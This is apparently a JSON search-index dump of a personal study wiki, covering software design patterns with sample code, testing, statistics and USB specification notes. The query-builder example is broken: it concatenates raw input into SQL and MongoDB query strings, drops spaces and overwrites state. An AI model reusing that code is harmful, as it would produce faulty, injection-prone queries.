\u0026ldquo;purchase\u0026rdquo; busines process. One can happen in the brick and mortar shop and on the online shop. The business process will be the same, but you might get inputs in a different way.\nLet\u0026rsquo;s say we have query builder for MongoDB and MySQL.\n// The query is an output that we desire from our builder, ALWAYS class query { public String queryString {get; set} } // We define here what steps it requires to build a query. class AbstractQueryBuilder { abstract void setCollectionName(string collectionName); abstract void setId(string id); abstract string getQuery(); } // Now we can make a builder for SQL class SQLQueryBuilder : AbstractQueryBuilder{ private Query query = new Query(); public void setCollectionName(string collectionName){ query.queryString += \u0026#39; FROM \u0026#39; + collectionName; } public void setId(string id){ query.queryString = \u0026#39;SELECT\u0026#39; + id + query.queryString; } } // Now we can make a builder for MongoDb class MongoDBQueryBuilder : AbstractQueryBuilder{ private Query query = new Query(); public void setCollectionName(string collectionName){ query.queryString += \u0026#39;.collection(\u0026#39; + collectionName + \u0026#39;)\u0026#39;; } public void setId(string id){ query.queryString = \u0026#39;.findOne({ id: \u0026#39; + id + \u0026#39;})\u0026#39;; } } // Now we have the director of the process class DataFetcher { private AbstractQueryBuilder queryBuilder; public(AbstractQueryBuilder queryBuilder){ this.queryBuilder = queryBuilder; } public Data fetch(string id, string collectionName){ queryBuilder.setId(id); queryBuilder.setCollectionName(collectionName); // execute query from queryBuilder.query return data; } } // Using it var dataFetcher = new DataFetcher(new SQLQueryBuilder()); dataFetcher.fetch(\u0026#34;100\u0026#34;, \u0026#34;users\u0026#34;); Other example\nFactory Method # The classic example of where we want to hide the new keyword and decide dynamically or only in one place which concrete class we might want to return for further usage.\ninterface IDbStore {}; class MongoDb : IDbStore {}; class MySQL : IDbStore {}; static class DBStoreFactory{ static public IDbStore getDbStore(){ // Return based on a config or some business logic the MongoDb or SQL instance. } } Object pool # Object pooling can offer a significant performance boost; it is most effective in situations where the cost of initializing a class instance is high, the rate of instantiation of a class is high, and the number of instantiations in use at any one time is low. (aka resource pools).\nSo if initializing a class is expensive, happens a lot but don\u0026rsquo;t use many instances at the same time, we want to reuse instances.\nA good example would be a DB Connection Pool. There are a few connections in the pool, to create a connection, is IO expensive. We might wanna fetch data all over the application, but we might not be using the connections so much all the time, so we create a pool of connections, so we can pick up an unused connection when a data fetch is required.\nUsually there will be a max pool size. The pool is responsible to orchestrate the lock/acquiring of a pool object and releasing it for reuse.\nSingleton # There is only one instance allowed to be used. So you create a function that returns always the same instance, and initializes one of it was not initialized before.\nThis initialization can be done at startup or lazy wise, only untill the first instance is requested.\n// Lazy class MyClass { private MyClass myInstance; private MyClass(){ // PRIVATE CONSTRUCTOR } static getInstance(){ if(myInstance == null){ this.myInstance = new MyClass(); } return this.myInstance ; } }; Important to take in mind when multithreading is happening, in that case you should add the extra safeguarding code to be thread safe.\nStructural patterns # In Software Engineering, Structural Design Patterns are Design Patterns that ease the design by identifying a simple way to realize relationships between entities.\nAdapter # The adapter is basically a wrapper so it \u0026ldquo;connects\u0026rdquo; nicely between two parts that else mismatch. A typical example is when you use a 3th party library in your solution, but how it works and the view of the world differes from yours and your code. So if you have a GitApiClient module published by Git, you would want it to wrap it so it behaves and interacts how you would want it to interact in your application. So you create a wrapper around it so it has the API that you desire and that is adapted to your code base.\nBridge # Decouple an abstraction from its implementation so that the two can vary independently.\nWe would use this pattern to solve a hectic hierarchical iheritance issue.\nLet\u0026rsquo;s say we have a Logger. And we want to have two types of loggers, a BatchLogger and a SimpleLogger. The SimpleLogger writes out a log entry to the STDOUT when it\u0026rsquo;s called. The BatchLogger accumulates a min amount of log entries before it writes it away to the STDOUT.\nWe would just create a ILogger interface and then the SimpleLogger and BatchLogger implementation.\nBut now we want to be able to log not only to STDOUT but alternatively to a API endpoint instead. Now we would have to create an API and STDOUT version of each logger. Resulting in ApiBatchLogger,StdOutBatchLogger, ApiSimpleLogger and StdOutSimpleLogger. Notice how this hierarchy becomes a mess and deep. We create more inheritance just because we have code that doesn\u0026rsquo;t move in parallel and rather orthogonally.\nHow do we solve this? This reminds us a bit of preffer composition over inheritance idea. Let\u0026rsquo;s rewrite our code.\nWe move the log to ... logic out of the hierarchy and move it to something separate. Let\u0026rsquo;s call it a LogGateway interface. Now we can have the SimpleLogger and BatchLogger take a LogGateway interfaces as reference. Now we end up with SimpleLogger, BatchLogger, ApiLogGateway, and StdOutLogGateway. Now we don\u0026rsquo;t need to implement a new logger based on the fact if it\u0026rsquo;s simple or batch AND for each given gateway we wanne use to write the logs to. Rearranging our inheritance so that we don\u0026rsquo;t end up with deep inheritance hierarchies and we can rather take the benefit of composition.\nDecorator # Attach additional responsibilities to an object dynamically.\nYou wrap the call to a function but then decorate it with extra behaviour. So you can add \u0026ldquo;optional\u0026rdquo; decorators that will execute additional logic on top of the share logic.\nThis can be done dynamically at runtime.\n// 1. \u0026#34;lowest common denominator\u0026#34; interface Widget { void draw(); } // 3. \u0026#34;Core\u0026#34; class with \u0026#34;is a\u0026#34; relationship class TextField implements Widget { private int width, height; public TextField(int width, int height) { this.width = width; this.height = height; } public void draw() { System.out.println(\u0026#34;TextField: \u0026#34; + width + \u0026#34;, \u0026#34; + height); } } // 2. Second level base class with \u0026#34;isa\u0026#34; relationship abstract class Decorator implements Widget { // 4. \u0026#34;has a\u0026#34; relationship private Widget widget; public Decorator(Widget widget) { this.widget = widget; } // 5. Delegation public void draw() { widget.draw(); } } // 6. Optional embellishment class BorderDecorator extends Decorator { public BorderDecorator(Widget widget) { super(widget); } public void draw() { // 7. Delegate to base class and add extra stuff super.draw(); System.out.println(\u0026#34; BorderDecorator\u0026#34;); } } // 6. Optional embellishment class ScrollDecorator extends Decorator { public ScrollDecorator(Widget widget) { super(widget); } public void draw() { super.draw(); // 7. Delegate to base class and add extra stuff System.out.println(\u0026#34; ScrollDecorator\u0026#34;); } } public class DecoratorDemo { public static void main(String[] args) { // 8. Client has the responsibility to compose desired configurations Widget widget = new BorderDecorator(new BorderDecorator(new ScrollDecorator(new TextField(80, 24)))); widget.draw(); } } Outputs\nTextField: 80, 24 ScrollDecorator // Aditional logic executed beside the original core one BorderDecorator // Aditional logic executed beside the original core one BorderDecorator // Aditional logic executed beside the original core one So we dynmically added extra code to be excuted on top of the core functionality.\nFacade # A facade is just a layer that hides all the sub systems or components being called. A good example of that is when you create a library which has internally differen util classes and services. But then you create on \u0026ldquo;facace\u0026rdquo; that will expose the methods that only need to be exposed to the user of this library, while internally the methods are spread into smaller sub components.\nThis way you encapsulate the internal workings and structure of the library.\nFlyweight # The Flyweight uses sharing to support large numbers of objects efficiently. Modern web browsers use this technique to prevent loading same images twice. When browser loads a web page, it traverse through all images on that page. Browser loads all new images from Internet and places them the internal cache. For already loaded images, a flyweight object is created, which has some unique data like position within the page, but everything else is referenced to the cached one.\nProxy # Like all proxies, you pust sugorate in between so you can add additional logic and take control, so the real target object is protected from additional complexity. Perfect also to create aspects and such.\nBehavioral patterns # In software engineering, behavioral design patterns are design patterns that identify common communication patterns between objects and realize these patterns. By doing so, these patterns increase flexibility in carrying out this communication\nChain of responsibility # The pattern chains the receiving objects together, and then passes any request messages from object to object until it reaches an object capable of handling the message. The number and type of handler objects isn\u0026rsquo;t known a priori, they can be configured dynamically. The chaining mechanism uses recursive composition to allow an unlimited number of handlers to be linked.\nChain of Responsibility simplifies object interconnections. Instead of senders and receivers maintaining references to all candidate receivers, each sender keeps a single reference to the head of the chain, and each receiver keeps a single reference to its immediate successor in the chain.\nCommand # Encapsulate a request as an object, thereby letting you parametrize clients with different requests, queue or log requests, and support undoable operations.\nBasically put all the data required to run a command in an object. Pass this on so dynamically a proper command handler can execute the command.\ninterface ICommand { void execute(); } var queue = new List\u0026lt;ICommands\u0026gt;{...}; queue.execute(); Iterator # Hide the underlying logic and complecity for getting the next value.\nMediator # Design an intermediary to decouple many peers. Define an object that encapsulates how a set of objects interact. Mediator promotes loose coupling by keeping objects from referring to each other explicitly, and it lets you vary their interaction independently.\nPartitioning a system into many objects generally enhances reusability, but proliferating interconnections between those objects tend to reduce it again. The mediator object: encapsulates all interconnections, acts as the hub of communication, is responsible for controlling and coordinating the interactions of its clients, and promotes loose coupling by keeping objects from referring to each other explicitly.\nGoal is to remove direct/explicit relations between different objects types.\nThe Mediator defines an object that controls how a set of objects interact. Loose coupling between colleague objects is achieved by having colleagues communicate with the Mediator, rather than with each other. The control tower at a controlled airport demonstrates this pattern very well. The pilots of the planes approaching or departing the terminal area communicate with the tower rather than explicitly communicating with one another. The constraints on who can take off or land are enforced by the tower. It is important to note that the tower does not control the whole flight. It exists only to enforce constraints in the terminal area.\nMemento # Without violating encapsulation, capture and externalize an object\u0026rsquo;s internal state so that the object can be returned to this state later.\nBasically we want to be able to do undo or rollback. So we keep snapshots/deltas of the changes we make so we can return a specific state later.\nIt\u0026rsquo;s like the following\nclass TheWorld { setSnapshot(); createSnapShot(); } class TheWorldMoment{ getState(); setState(); } var world = new TheWorld(); // Do changes ... var snapshot1 = world.createSnapShot(); // Do changes ... var snapshot2 = world.createSnapShot(); // Restore to state since we took snapshot 1 world.setSnapshot(snapshot1); Null Object # The null object pattern is perfect to get rid of all this defensive coding with if returnValue == null and such.\nInstead of returning a null from a (e.g. factory) function, you can return an object that implements certain interface or abstract class, but does nothing. So basically doing a silent \u0026ldquo;no-operation\u0026rdquo; or anything similar like that.\nIt is sometimes thought that Null Objects are over simple and \u0026ldquo;stupid\u0026rdquo; but in truth a Null Object always knows exactly what needs to be done without interacting with any other objects. So in truth it is very \u0026ldquo;smart.\u0026rdquo;\nThe Null Object class is often implemented as a Singleton to save memory as it\u0026rsquo;s stateless anyway. Observer # Idea is that you have a Observable with zero, one or more Observers. If the state changes in the Observable, it will notify all Observers. Usually with this pattern the Observable keeps a list/references of all Observers, so this is create a thight coupling of awareness, consider a pub/sub mechanism if you want to create a more loosely coupled approach where the observers and obserables are unaware of each other.\nState # Intersting, so instead of changing behaviour purely based on changing state in an object, we will create an abstract class, and each subclass will represent an allowed state. (Use polymoprhism instead of ENUMS/Constants). This is one way !\nEverytime you have a finite state machine, evaluate this pattern. The State pattern does not specify where the state transitions will be defined. The choices are two: the \u0026ldquo;context\u0026rdquo; object, or each individual State derived class. The advantage of the latter option is ease of adding new State derived classes. The disadvantage is each State derived class has knowledge of (coupling to) its siblings, which introduces dependencies between subclasses.\nState objects are often Singletons. Flyweight explains when and how State objects can be shared. Strategy # Define a family of algorithms, encapsulate each one, and make them interchangeable. Strategy lets the algorithm vary independently from the clients that use it.\nThis is perfect when you have algorithms that work perfect for a specific size of data set. This is basicaly the core Open/Closed principle of the SOLID. Define one Interface/Abstract class, and have different implementations that have a different strategy.\nTemplate method # Define the skeleton of an algorithm in an operation, deferring some steps to client subclasses. Template Method lets subclasses redefine certain steps of an algorithm without changing the algorithm\u0026rsquo;s structure.\nBase class declares algorithm \u0026lsquo;placeholders\u0026rsquo;, and derived classes implement the placeholders.\nThis use used more than you think. Think of VueJS where you have \u0026ldquo;hooks\u0026rdquo;. There is a strict process, but you can overwrite or append within a specific atomic step.\nThis is typicall to have a root class BusinessProcess, which has methods stepA(), stepB(), and `stepC() and then you can subclass it and optionally choose with step you want to override with your own logic.\nAnother example is : Kind of basic inheritance.\n\u0026ldquo;the Hollywood principle\u0026rdquo; - \u0026ldquo;don\u0026rsquo;t call us, we\u0026rsquo;ll call you\u0026rdquo;.\n"},{"id":109,"href":"/software-development-process/","title":"Software Development Process","section":"","content":" Software Development # Internal Open Source DORA Metrics # Source Trunk Based Development # Why Pull Requests Are A BAD Idea Suggested Alternative for Code Review: Pair Programming "},{"id":110,"href":"/software-development-process/internal-open-source/","title":"Internal Open Source","section":"Software Development Process","content":" Internal Open Source # Resources # https://innersourcecommons.org/ https://engineering.atspotify.com/2014/03/spotify-engineering-culture-part-1/ https://opensource.google/documentation/reference/ https://youtu.be/PMSoHPuD8G8?si=KonTNV9C2H1ZO8wT https://www.redhat.com/en/blog/ins-and-outs-innersource https://www.youtube.com/watch?v=IEwtBi7P9cQ "},{"id":111,"href":"/software-testing/","title":"Software Testing","section":"","content":" Software Testing # Behavior Driven Testing # BDD is a mindset, philosophy on how to better explain do TDD. TDD can go wrong by focusing on coverage and tests that are hard to read. BDD gives an extra layer that takes the angle of the end user, not you, the creator, and explains on the high level how a feature or scenario should go. BDD is the layer or \u0026ldquo;What to test (a flow/feature/scenario)\u0026rdquo; Underneath there is the code on \u0026ldquo;how to test\u0026rdquo; this flow/feature/scenario, this is an implementation detail that can change over time. Any good test should rather say what it tests, than how, just like when writing code. A good TDD approach would actually look like BDD, tools like gherkin and SpecFlow are not a must, you can technically write just clearer tests that follow this philosophy. Remember, BDD was to help avoid misunderstandings about TDD. So they are not mutually exclusive and rather complementary. Tests that are about \u0026ldquo;how to test\u0026rdquo; you are structured are easier to maintain, if the implementation changed of the design, the test still indicates what it intends to test. BDD is a flavour to TDD one could argue. Resources # Guide to BDD TDD vs BDD "},{"id":112,"href":"/statistics/","title":"Statistics","section":"","content":" Statistics # Statistics (or statistical analysis) is a lot like good detective work. The data yields clues and patterns that can ultimately lead to meaningful conclusions.\nWhy statistics # This allows to determine answers to questions which are not economical to answer. You can not count every homeless in a country, thats expensive and time consuming. You can take a small quality sample (quality is key!) to then interfere or project the probably number.\nEven in best of circumstances, statistical analysis rarely unveils \u0026ldquo;the truth\u0026rdquo;. We are usually building circumstantial based based on imperfect data. As a result, there are numerous reasons that intellectually honest people may disagree about statistical results or their implications.\nStatistics can give some insight who the best baseball player is, but that\u0026rsquo;s not perse what makes up being \u0026ldquo;the best\u0026rdquo;, cause there is no objective definition of what a \u0026ldquo;the best baseball player\u0026rdquo; means.\nSmart and honest people will often disagree about that data re trying to tell us.\nWhy Learn? # To summarize huge quantities of data. To make better decisions. To answer important social questions. To recognize patterns that can refine how we do everything from selling diapers to catching criminals. To evaluate the effectiveness of policies, programs, drugs, medical procedures, and other innovations. To spot those who use statistics for nefarious ends (and lying). Basic Experiments # In a good experiment you have \u0026ldquo;one variable\u0026rdquo; that differs between your \u0026ldquo;experiment group\u0026rdquo; and your \u0026ldquo;control group\u0026rdquo;. The control group shares everything with the experiment group, except for one variable. For example, the experiment group eats everyday 1 apple, and the other group eats everyday 1 pear.\nStatistical Significance # The analysis has uncovered an association of 2 variables that ia not likely to be product of chance alone. Regression analysis can for example find a relation between 2 variables and how likely that relationship is by accident or not. If there is a relationship, and it doesn\u0026rsquo;t seem very accidental, it\u0026rsquo;s statistically significant.\nRegression Analysis # The tool to isolate the relationship between to variables, such as smoking and cancer, while holding constant (or \u0026ldquo;controlling for\u0026rdquo;) the effects of other important variables (such as diet, exercise, weight, \u0026hellip;)\nRegression analysis is primarily used to assess the strength and nature of relationships between variables, but it does not directly establish causation. This is also the limitation, we can identify strong relationships, but we cant determine causality, or in other words \u0026ldquo;WHY?\u0026rdquo;.\nUsually you start with a hypotheses, \u0026ldquo;I think these 2 variables have a relationship\u0026rdquo; and then use regression analysis to validate that hypothesi.\nExample # The Conclusion # Eating a bran muffin every day will reduce your chances of getting colon cancer.\nThe Methodology # First they gather detailed information on thousands of people, including how frequently they eat brand muffin\u0026rsquo;s and then apply regression analysis:\nQuantify the association observed between eating bran muffins and contracting colon cancer. E.g. Hypothetical finding that people who eat bran muffins have 9% lower incidence of colon cancer, controlling for the other factors that may affect the incidence of the disease. Quantify the likelihood that the association (relation) between bran muffin\u0026rsquo;s and a lower rate of colon cancer observed is merely a coincidence (a quick in the data for this sample of people), rather than a meaningful insight about the relationship between diet and health. Descriptive Statistic (aka Summary Statistic) # A simplification of a complex data set or array of data. We perform calculations that reduce a complex array of data into a handful of numbers that describe those data. These descriptive statistics give us a manageable and meaningful summary of the underlying phenomenon. But simplification invites abuse.\nExamples Descriptive Statistic:\nThe health of the Belgian middle class Olympic gymnastics performance Statistical Measures # The Mean # What most people understand as \u0026ldquo;average\u0026rdquo;, although, more specific its the Arithmetic Mean that most people assume what is referred to.\nThe Median # What is the middle value? 50% of values are below and 50% of values are above the median.\nThe median is the middle value in a dataset when the data points are arranged in ascending or descending order. If there is an even number of observations, the median is the average of the two middle numbers. The median is useful when the data has outliers or is skewed, as it is not affected by extreme values. The Mode # For what value is the highest concentration? Let\u0026rsquo;s say, there is no bigger group than the group that earns 5000 EUR.\nThe mode is the value that appears most frequently in a dataset. A dataset can have more than one mode (bimodal, multi-modal) if multiple values appear with the same highest frequency. The mode is particularly useful for categorical data where we wish to know which is the most common category. Percentiles # Tells you what percentage of a dataset falls below a certain point.\nFor example:\nIf you\u0026rsquo;re in the 90th percentile in a test, that means you scored higher than 90% of the people who took the test. Similarly, if a value is at the 25th percentile, it means that 25% of the data points are below that value.\nThe 50th percentile is also known as the median, meaning half the data is below it and half is above.\nStandard Deviation # How spread out the values in a dataset are from the mean (average). It measures the dispersion of the values.\nIf the standard deviation is small, it means the data points are close to the mean, or the values are clustered tightly around the average. If the test scores in a class have a small standard deviation, most students scored around the same as the average score. If the standard deviation is large, it means the data points are more spread out, or the values vary widely from the average. If the standard deviation is large, students\u0026rsquo; scores vary a lotâsome did much better or worse than the average. P-Valu # Whatâs a p-value? # A p-value helps you decide if something youâre testing in an experiment is just a coincidence or if itâs likely a real effect. Itâs basically a number that tells you how surprising your results are if the thing youâre testing isnât actually doing anything.\nImagine this: # Letâs say youâre flipping a coin, and you think the coin might be biased (like maybe it lands on heads more than tails). Normally, a fair coin should land on heads 50% of the time and tails 50% of the time, right?\nNow, you flip the coin 10 times and get 8 heads. This seems like a lot of heads, but before saying the coin is unfair, you want to know: âCould this just happen by chance?â\nHereâs where the p-value comes in: # The p-value is a number that answers the question: If the coin is really fair (no bias), how likely would it be to get 8 heads (or something even more extreme)? If the p-value is very small (like 0.01 or 0.001), it means getting 8 heads (or more) by pure chance would be very rare if the coin were truly fair. So youâd suspect the coin might actually be biased. If the p-value is bigger (like 0.3 or 0.5), it means getting 8 heads could easily happen just by chance, and thereâs no good reason to think the coin is unfair. How do you use it? # Scientists pick a cutoff number (usually 0.05) to decide:\nIf the p-value is smaller than 0.05, you say: âThis is unlikely to be a coincidence. There might be something real happening here,â and you reject the idea that the coin is fair. If the p-value is bigger than 0.05, you say: âThis could easily be a coincidence,â and you donât reject the idea that the coin is fair. In short: # Small p-value (like 0.01): Your results are surprising, and something interesting might be going on. Big p-value (like 0.3): Your results arenât surprising, and it could just be random chance. Hope that makes it clearer! Let me know if you need more examples. :)\nHow to Lie with statistics # The Sample With the Built-In Bias # When there is a poll or statistic, one must scrutinize the sample which was used to calculate the statistic. Getting an unbiased sample is extremely hard or near to impossible?\nExample: The avg salary of a Yale student of the 1924 graduate is now earning 25000 Dollar/Year. Did they send a questionnaire to all students (did they have their address), maybe those who they don\u0026rsquo;t have the address of are the super successful, or they all passed away and so on. Next, those with known addresses are now already a biased set that might miss out on significant higher or lower earners. How many respond? Maybe 10% ? What differentiates the onces who feel like responding from the others? When they do respond, are they being honest. People dare to lie , a lot, on questionnaires, interviews and poll. Consciously or subconsciously.\nJust going on the street and interview people is biased, based on the place, time and maybe who the interviewers feels attracted to.\nA purely random sample is hard, almost impossible to come by. Ask yourself how a sample can be biased.\nThe Well Chosen Average # There are different types of averages that one can \u0026ldquo;conveniently\u0026rdquo; use and not lie.\nThe Mean: What most people understand as \u0026ldquo;average\u0026rdquo;, although, more specific its the Arithmetic Mean that most people assume what is referred to. The Mean has 3 variations again: Arithmetic: Geometric: Harmonic: The Median: What is the middle value? 50% of values are below and 50% of values are above the median. The median is the middle value in a dataset when the data points are arranged in ascending or descending order. If there is an even number of observations, the median is the average of the two middle numbers. The median is useful when the data has outliers or is skewed, as it is not affected by extreme values. The Mode: For what value is the highest concentration? Let\u0026rsquo;s say, there is no bigger group than the group that earns 5000 EUR. The mode is the value that appears most frequently in a dataset. A dataset can have more than one mode (bimodal, multi-modal) if multiple values appear with the same highest frequency. The mode is particularly useful for categorical data where we wish to know which is the most common category. When there is a perfect bell shape distribution, these 3 types of averages would have the exact same value. If the distribution has another shape, these can be widely different and misleading. How these 3 differ exactly from each other, tells something about the distribution.\nDistributions # Distributions describe the pattern of data points. Distributions can be of any shape, but there are a few key types.\nNormal: Bell Shaped and symmetric around the mean Skewed: Higher concentration on one end or the other. Left / Negative Skew: Long tail on the left. Most data points concentrated on the right side. Right / Positive Skew: Long tail on the right. Most data points concentrated on the left side. Bimodal: There are 2 peaks (modes) instead of one. Multi-modal: More than 2 peaks. Uniform: All outcomes are equally likely. Exponential: Right skewed with rapid decrease in frequency as you move away from the mode. And many more, here are some visualizations of them Set 1 Set 2 Set 3 Extra Average Types # Weighted Mean accounts for varying significance of data points. Trimmed Mean reduces the influence of outliers. Calculated by removing a certain percentage of the smallest and largest data points before calculating the arithmetic mean. Midrange offers a basic central value but is not robust against outliers. The average of the maximum and minimum values in a dataset. It provides a simple measure of central tendency but is highly sensitive to outliers. Formula: (Max Value + Min Value) / 2 Critically think about statistics # Following are some types on how to analyze critically any statistics.\n(Who Says So) Look for bias: A laboratory with something to prove for the sake of a theory, reputation or a fee. A newspaper whose aim is a good story. Conscious bias: Direct misstatement or ambiguous statements that serves well and cannot be \u0026ldquo;convicted\u0026rdquo;. E.g. Selecting favorable data (dentist company retrying till they have a study with favorable results) E.g. Favorable measure (use mean instead of a median or \u0026hellip;. when they just say \u0026ldquo;average\u0026rdquo;) Unconscious bias: By using \u0026ldquo;big names\u0026rdquo; like \u0026ldquo;cornel university\u0026rdquo; but then the conclusion was from the writer, not from the referenced study. (How Does he know?) Biased Samples: The sample which was used can be biased, if a questionnaire is sent out and only 10% responses, this creates a very real risk that the sample is biased. Reported correlation: Is the correlation big enough to have meaning? Is it significant enough? (What\u0026rsquo;s missing) What key data, information or context is missing from provided information? Is this a mean, median or mode average? What is the probable error or standard error What is the distribution? Bigger picture data ? e.g. This week the deaths was 60% than average, but maybe that\u0026rsquo;s normal ? Seasonal peaks ? Context and distribution and past trends might be missing to contextualize it. (Did somebody change the subject) Switch somewhere between the raw figure and the conclusion. Confusion between one thing and the other. E.g. More reported cases of a disease is not the same as more cases of the disease. Reporting could have been bad before or lacking. So it can be easily \u0026ldquo;switched\u0026rdquo; to give the wrong impression. What people \u0026ldquo;say or report\u0026rdquo; is not perse the same as \u0026ldquo;what they actually do\u0026rdquo;. They might not be enough self aware of their actual behavior or they lie to present themselves etc\u0026hellip; Risk with self reporting. E.g. The price for a prison is more than the price of a luxury hotel. Well you switch here between the rent you pay versus the TOTAL MAINTENANCE COST of a prison cell. \u0026ldquo;Be the first in\u0026rdquo; can be done very easy, if you make it unique enough. (e.g. hottest 2nd of June since 1948) Switch between revenue and net profit casually (Does it make sense?) I guess, look at the context, life expectancy will be very different based on your birth date. Therefore OVerly specific numbers for a mean can be misleading, as it might give wrong sense of accuracy. E.g. A person needs 100$ to have enough food to survive, so we only give 100$ unemployment support. There are key things missing! Past trends might be facts, but future trends are just best estimate (like weather). Framing and misleading representations E.g. a map that colors all stated who have a certain crime rate, big states with low population can easily dominate the whole visualization. E.g. When the scales of a graph are trimmed or tweaked to make the shape look more impressive. A hypothesis as conclusion One can find a strong relationship in data (e.g. with regression analysis), but not the causality, so they then might draw up a hypotheses. You might mistake this as the actual \u0026ldquo;reason\u0026rdquo;, while it\u0026rsquo;s just \u0026ldquo;a hypothesis\u0026rdquo; to explain a statistically significant relationship. "},{"id":113,"href":"/usb-spec/","title":"USB Spec","section":"","content":" USB Spec and how it works # Here I summerize useful information on how USB works, this is a part of my research project to use a PS4 controller in the browser.\nTerms And Abbreviations # The extensive list can be found here.\nArchitectural Overview # Host-scheduled, token-based protocol.\nUSB System # 3 areas\nUSB interconnect (Manner which USB devices are connected and communicate with the host) Bus Topology Inter-layer relationships: In terms a capability stack, the USB tasks performed at each layer in the system. Data Flow Models: Manner in which data moves USB Schedule USB Devices USB host A USB device usually provides one or more \u0026ldquo;functions\u0026rdquo;.\nUSB Protocol # All communication happens through a POLLING mechanism. So the USB Bus Protocol is Poll oriented.\nMost bus transactions involve transmissions of up to 3 packets. Each transaction begins when the Host Controller, on a scheduled basis, sends a USB Token packet describing the:\nType of transaction Direction of transaction (IN or OUT) the USB device address Endpoint number The addressed USB device selects itself by decoding the appropriate address fields. (AH! That\u0026rsquo;s me!). The targeted device will then send a data packet or indicate if it has no data to transfer. The host will then reply witha handshake packet indicating if the transfer was successful.\nThe data transfer model between source and destination on the host and an endpoint is reffered to as a pipe.\nA pipe can be\nStream pipe (has no USB defined structure) Message pipe (has USB defined structure) One message pipe, the Default Control Pipe always exists once a device is powered. (used for device\u0026rsquo;s configuration, status and control information)\nThe Host assigns a unique USB address to a newly attached device and then determines if it\u0026rsquo;s a Device or Hub or a Function. Then the hosts establishes its end of the control pipe for the newly attached USB device using the assigned USB address and endpoint 0x0.\nIf the newly attached device is a hub with attached devices, the above procedure is followed for each of the attached USB devices.\nUSB Enumeration # Activity that identifies and assigns unique address to devices attached to a bus. This happens periodically and does the detection of removing and adding of devices.\nData Flow Types # Data and control change happens through a set of either uni-directional or bi-directional pipes. Transfer take place between host software and a particular endpoint on a USB device. The association between the Host Software and a USB device endpoint is a pipe. In general, data movement through one pipe is independent from the data flow of any other pipe.\nControl Transfer : USed to configure a device at attach time and can be used for other device-specific purposes, including control of other pipes on the device. Bulk Data Traansfers Generated or consumed in relatively large and bursty quantities and have wide dynamic latitude in transmission constraints. Interupt Data Transfer Used for timely but reliable delivery of data,. Isochronous Data Occupy a prenegotiated amount of USB Bandwidth with a prenegotiated delivery latency. Typically for real time consumption. As this is for real time, errors are often not corrected. A single pipe only supports one data flow type for any given device configuration.\nUSB Devices # Devices are divided into classes such as hub, human interface, printer, imaging or mass storage device.\nEach device is assigned an address when attached and enumerated. USB devices will have a designated pipe at endpoint 0x0 where to the *Default Control Transfer` pipe will be established. From the default control pipe we get the characteristics of a device:\nClass USB Vendor Standard Two major classes exist, hubs and functions. Functions provide capabilities to the host, hubs just more connections.\nA device can have multiple functions (like sound and video, like a webcam). Each function will have a configuration. Before function can be used, it MUST be configured by the host.\nUSB Data Flow Model # Protocol Layer # \u0026hellip; maybe others\n"},{"id":114,"href":"/usb-spec/terms_and_abbreviations/","title":"Terms and Abbreviations","section":"USB Spec","content":" Terms and Abbreviations # I\u0026rsquo;m listing here terms and abbreviations that were relevant for my research. Skipping some more mainstream ones like \u0026ldquo;audio device\u0026rdquo; and \u0026ldquo;Big Endian\u0026rdquo;.\nACK (packet) # A packet that signals a positive handshake acknowledgement.\nActive Device # Device that is powered and not in suspend state.\nAsynchronous Data # Data transferred at irregular intervals with relaxed latency requirements.\nAsynchronous RA # The incoming and outgoing data rate of the RA process. The rates are in this case independent (notice async), meaning there is also no shared master clock.\nAsynchronous SRC # The incoming and outgoing sample rate of the SRC process.\nBabble # Unexpected bus activity that persists beyond a specified point in a (micro)frame.\nBit Stuffing # Insertion of 0 bits into a data stream to cause electrical transition on the data wires.\nb/s # Bits/second\nB/s # Bytes/second\nBuffer # Storage used to compensate for a difference in data rates or time of occurrence of events, when transmitting data from on device to another.\nBulk Transfer # One of the 4 USB transfer types. Non-periodic, large busty communication typically used for a transfer that can use any available bandwidth and can also be delayed until bandwith is available.\nBus Enumeration # Detecting and identifying USB devices.\nCapabilities # Those attributes of a USB device that are administrated by the host.\nCharacteristics # Those qualities of a USB device that are unchangeable; for example, the device class is a device characteristics.\nClient # Software resident on the host that interacts with the USB System Software to arrange data transfer between a function and the host. The client is often the data provider and consumer for transferred data.\nConfiguring Software # Software resident on the host software that is responsible for configuring a USB device. This may be a system configurator or specific to the device.\nControl Endpoint # A pair of device endpoints with the same endpoint number that are used by a control pipe. Control endpoints transfer data in both directions and, therefore, use both endpoint directions of a device and endpoint number combination. Thus, each control endpoint consumes two endpoint addresses. See also Device Endpoint\nControl Pipe # Same as a message pipe.\nControl Transfer # One of the 4 USB transfer types. Control transfers support configuration/command/status type communications between client and function.\nCRC (Cyclic Redundancy Check) # A check performed on data to see if an error has occured in transmitting, reading or writing the data. The CRC is typically stored or transmitted with the checked data. This helps to determine if an error occured.\nCTI # Computer Telephony Integration\nDefault Address # An address defined by the USB Spec and used by the USB device when it is first powered or reset. Default is 0x00.\nDefault pipe # Message pipe created by the USB System Software to pass control and status information between the host and a USB device\u0026rsquo;s endpoint zero.\nDevice Address # Seven-bit value representing the address of a device on USB. Default is 0x00. Addresses are uniquely assigned by USB System Software.\nDevice Endpoint # A uniquely addressable portion of a USB device that is the source or sink of information in a communication flow between the host and device. See also Control Endpoint\nDevice Resources # Resources provided by USB devices, such as buffer space and endpoints. See also Host Resources and Universal Serial Bus Resources.\nDevice Software # Software responsible for using a USB device. May ir may bit also be responsible for configuring the device to use.\nDownstream # Direction of flow from the host or away from the host\nDriver # When reffering hardware - An I/O pad that drives an external load. When referring software - A program responsible for interfacing to a hardware device (a device driver). DWORD (Double Word) # A data element that is two words. (e.g. four bytes or 32 bits when the word size is 2 bytes)\nDynamic Insertion And Removal # The ability to attach and remove devices while the host is in operation.\nEnd User # The user of a host.\nEndpoint # Same as Device endpoint\nEndpoint Address # The combination of an endpoint number and an endpoint direction on a USB device. Each endpoint address supports data transfer in one direction. Basically there will be two addresses at least for a USB device. Each one address has then a bit that dictates the direction.\nEndpoint Direction # The direction of data transfer on the USB. This can be:\nIN - transfer to the host OUT - Transfers out from the host Endpoint Number # A four bit value between 0x0 and 0xF, inclusive, associated with an endpoint on a USB device.\nEOF (End-of-(micro)Frame) # Self explaining\nEOP (End-of-Packet) # Self explaining\nFrame # a 1 ms time based established on full/low -speed buses.\nFrame Pattern # A sequence of frames that exhibit a repeating pattern in the number of samples transmitted per frame.\nFs # Sample rate\nFull-duplex # Simultaneously data transmission in both directions.\nFunction # A USB device that provides a capability to the host (like mic, speakers).\nHandshake Packet # A packet that acknowledges or rejects a specific condition.\nHost # Host computer systm where the USB Host controller is 